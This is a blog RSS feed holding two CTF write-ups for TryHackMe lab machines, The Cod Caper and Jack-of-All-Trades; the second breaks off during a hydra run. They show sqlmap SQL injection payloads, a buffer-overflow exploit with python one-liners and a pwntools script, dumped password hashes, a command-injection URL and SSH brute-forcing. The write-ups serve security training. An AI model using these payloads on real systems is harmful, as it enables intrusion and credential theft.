<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Tue, 14 Apr 2020 19:08:40 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>thecodcaper CTF | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope&lt;/p&gt;</description><link>http://localhost:2368/thecodca/</link><guid isPermaLink="false">5e90424a5e61514e230adc77</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 14 Apr 2020 18:52:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/pgn.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/pgn.png" alt="thecodcaper CTF | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.201.143
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 09:50 UTC
Nmap scan report for ip-10-10-201-143.eu-west-1.compute.internal (10.10.201.143)
Host is up (0.0018s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:8C:7D:6E:AC:54 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.201.143/ -w /usr/share/dirb/wordlists/big.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.201.143/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/10 09:53:19 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/administrator.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/04/10 09:53:22 Finished
===============================================================
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-10.56.10.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-10.57.37.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;So what's happening is that we will try to do a SQL injection in the POST data, we saved the request from burp and passed it to sqlmap&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -r request.txt --dbs
        ___
       __H__                                                                        
 ___ ___["]_____ ___ ___  {1.4#stable}                                              
|_ -| . [)]     | .'| . |                                                           
|___|_  [)]_|_|_|__,|  _|                                                           
      |_|V...       |_|   http://sqlmap.org                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:02:28 /2020-04-10/

[10:02:28] [INFO] parsing HTTP request from 'request.txt'
[10:02:28] [INFO] resuming back-end DBMS 'mysql' 
[10:02:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=admin' RLIKE (SELECT (CASE WHEN (7708=7708) THEN 0x61646d696e ELSE 0x28 END))-- MUAf&amp;amp;password=pass

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 1403 FROM(SELECT COUNT(*),CONCAT(0x71706a6271,(SELECT (ELT(1403=1403,1))),0x716b627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- staB&amp;amp;password=pass

    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3219 FROM (SELECT(SLEEP(5)))CJGe)-- kkog&amp;amp;password=pass
---
[10:02:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &amp;gt;= 5.0
[10:02:28] [INFO] fetching database names
[10:02:28] [INFO] used SQL query returns 5 entries
[10:02:28] [INFO] resumed: 'information_schema'
[10:02:28] [INFO] resumed: 'mysql'
[10:02:28] [INFO] resumed: 'performance_schema'
[10:02:28] [INFO] resumed: 'sys'
[10:02:28] [INFO] resumed: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[10:02:28] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.201.143'                                                                          
[10:02:28] [WARNING] you haven't updated sqlmap for more than 99 days!!!

[*] ending @ 10:02:28 /2020-04-10/

root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.03.59.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and we logged in with the credentials we got from the SQL injection, but the fun doesn't end there, we have a command prompt interacting with user &lt;strong&gt;www-data&lt;/strong&gt;, we definitely can do something about it.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.08.08.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after digging a little bit, I found the &lt;strong&gt;SSH&lt;/strong&gt; private key to the user in the machine, thought why not! let's enter from the front door.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/EsmlrgWNx5v0Y" width="480" height="433" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/what-whatever-shrug-EsmlrgWNx5v0Y"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# vim id_rsa
root@kali:~# locate ssh2john
/usr/share/john/ssh2john.py
root@kali:~# /usr/share/john/ssh2john.py id_rsa 
id_rsa has no password!
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;Great! no password 👌&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;But the issue here, when I tried to ssh to the machine, didn't let me in, it kept asking for the password, the next thing I thought about is a &lt;strong&gt;REVERSE SHELL&lt;/strong&gt; from the command prompt!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/yoJC2GnSClbPOkV0eA" width="480" height="401" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/excited-birthday-yeah-yoJC2GnSClbPOkV0eA"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;so I managed to make a simple one with &lt;strong&gt;echo&lt;/strong&gt; in the &lt;strong&gt;/tmp&lt;/strong&gt; file, I managed to run it, and get a reverse shell from the user &lt;strong&gt;www-data&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-11.24.12.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I then did some enumeration for files that are running as root for our user, to see if we can escalate. I used &lt;strong&gt;&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"&gt;LinPEAS&lt;/a&gt;&lt;/strong&gt; which is the new version of &lt;strong&gt;LinEnum&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;we found an interesting file called &lt;strong&gt;root&lt;/strong&gt; in &lt;strong&gt;/opt/secret/&lt;/strong&gt; and as explained by the CTF maker,&lt;strong&gt;"&lt;/strong&gt; The SUID file we found seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.&lt;/p&gt;&lt;p&gt;Run &lt;code&gt;gdb /opt/secret/root&lt;/code&gt; and you should see a screen similar to this&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.25.44.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type &lt;code&gt;r &amp;lt; &amp;lt;(cyclic 50)&lt;/code&gt;, that command runs the program and provides 50 characters worth of "cyclic" input.&lt;/p&gt;&lt;p&gt;Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.&lt;/p&gt;&lt;p&gt;Once you run that command you should see something similar to this screen&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.26.02.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time. Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP. Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.&lt;/p&gt;&lt;p&gt;Running &lt;code&gt;cyclic -l 0x6161616c&lt;/code&gt; outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.&lt;br&gt;That's all we needed for pre-explotation!&lt;/p&gt;&lt;p&gt;Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-12.26.18.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!&lt;br&gt;Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408" We can use python to do this, as it allows a nice way of converting.&lt;/p&gt;&lt;p&gt;Method 1 - Manual conversion:&lt;br&gt;&lt;code&gt;python -c 'print "A"*44 + "\xcb\x84\x04\x08"'&lt;/code&gt; will output the payload we want, but it requires manually converting to little endian&lt;/p&gt;&lt;p&gt;Method 2 - Struct:&lt;br&gt;&lt;code&gt;python -c 'import struct;print "A"*44 + struct.pack("&amp;lt;I",0x080484cb")'&lt;/code&gt;&lt;br&gt;It requires importing a module but struct.pack allows us to automatically convert memory to little endian. &lt;br&gt;We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary&lt;br&gt;&lt;code&gt;python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root&lt;/code&gt;&lt;br&gt;should provide you with this output.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/opt/secret$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root    
&amp;lt;$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root          
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Illegal instruction
www-data@ubuntu:/opt/secret$ su root
su root
Password: love2fish

root@ubuntu:/opt/secret#id
uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.&lt;br&gt;We start off the script with:&lt;/p&gt;&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;/p&gt;&lt;p&gt;This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.&lt;/p&gt;&lt;p&gt;We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.&lt;br&gt;With the ELF addition our script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().&lt;/p&gt;&lt;p&gt;fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our &lt;code&gt;proc&lt;/code&gt; variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.&lt;br&gt;With all that our final exploit script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;&lt;code&gt;payload = fit({&lt;/code&gt;&lt;br&gt;&lt;code&gt;44: shell_func # this adds the value of shell_func after 44 characters&lt;/code&gt;&lt;br&gt;&lt;code&gt;})&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.sendline(payload)&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.interactive()&lt;/code&gt;&lt;br&gt;Save that to a .py file and run it, and you should get this output:&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is &lt;code&gt;$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.&lt;/code&gt;&lt;strong&gt;"&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | The Cod Caper&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;A guided room taking you through infiltrating and exploiting a Linux system.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/O5GKT0UDGyQLu" width="480" height="271" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/penguins-O5GKT0UDGyQLu"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;</content:encoded></item><item><title>Jack-of-All-Trades TryHackMe | write-up</title><description>&lt;p&gt;Hello everyone, today's machine is so fun to break, I enjoyed every step I practised, Jack-of-All-Trades CTF challenge box was created for the Securi-Tay conference run on the 28th of February, 2020 by the &lt;strong&gt;&lt;a href="https://hacksoc.co.uk/"&gt;Hacksoc&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Let's start with some enumeration!&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.37.180
Starting&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jack-of-all-trades-tryhackme-write-up/</link><guid isPermaLink="false">5e9314b5ee23ee27e3575c25</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Sun, 12 Apr 2020 16:51:08 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/jackinthebox.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/jackinthebox.jpg" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;p&gt;Hello everyone, today's machine is so fun to break, I enjoyed every step I practised, Jack-of-All-Trades CTF challenge box was created for the Securi-Tay conference run on the 28th of February, 2020 by the &lt;strong&gt;&lt;a href="https://hacksoc.co.uk/"&gt;Hacksoc&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Let's start with some enumeration!&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.37.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 13:15 UTC
Nmap scan report for ip-10-10-37-180.eu-west-1.compute.internal (10.10.37.180)
Host is up (0.00079s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
MAC Address: 02:EC:EB:D2:86:84 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.36 seconds
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;as we can see we have two ports open &lt;strong&gt;SSH&lt;/strong&gt; on 80 and &lt;strong&gt;HTTP&lt;/strong&gt; on 22, they switched the port numbers for each one, It can be tricky if you don't pay attention. if we try to access the site it informs us that the request is cancelled for security purposes, because the port is used for different things {SSH} not HTTP.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.19.14.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.24.25.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;figcaption&gt;I left a link at the end containing an article explaining how to fix the issue step by step&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.25.25.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.26.18.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?******q
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.26.55.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Later checking the web source code, I noticed a base64 and a note for the user Jack in case he forgets his credentials. I visited the site but the credentials we have doesn't work, I tried to guess the user since he loves dinosaurs, well after I found the name of the dinosaurs all I read was stego! let's download the images on the web and see what's hidden.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=

Base32 &amp;gt; Hex &amp;gt; Rot13&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;Then I found this in the recovery.php, leaving us with a hint from a link redirecting to the dinosaur &lt;strong&gt;Stegosauria &lt;/strong&gt;in wikipedia&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-14.47.42.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop# steghide extract -sf stego.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".
root@kali:~/Desktop# cat creds.txt 
Hehe. Gotcha!

You're on the right path, but wrong image!
root@kali:~/Desktop#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;use the credentials that you got from the base64&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop# steghide extract -sf header.jpg 
Enter passphrase: 
wrote extracted data to "cms.creds".
root@kali:~/Desktop#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;use the credentials that you got from the base64&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-15.00.40.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after i logged in it sent us to this index.php file, that is very thirsty for commands ! &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/rcfkMp6qBfPDG" width="480" height="353" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/thirsty-baby-water-rcfkMp6qBfPDG"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;I started after browsing the machine, went to the home directory to check how many users directories we have and something interesting took my attention, a wordlist ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://10.10.68.189:22/nnxhweOV/index.php?cmd=ls /home/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;let's do some brute-forcing and see if the pass list we found is still containing password used by user Jack&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -l jack -P jack_pass.lst ssh://10.10.68.189:80/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-12 15:07:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ssh://10.10.68.189:80/
[80][ssh] host: 10.10.68.189   login: jack   password: IT*************@
1 of 1 target successfully completed, 1 valid password found
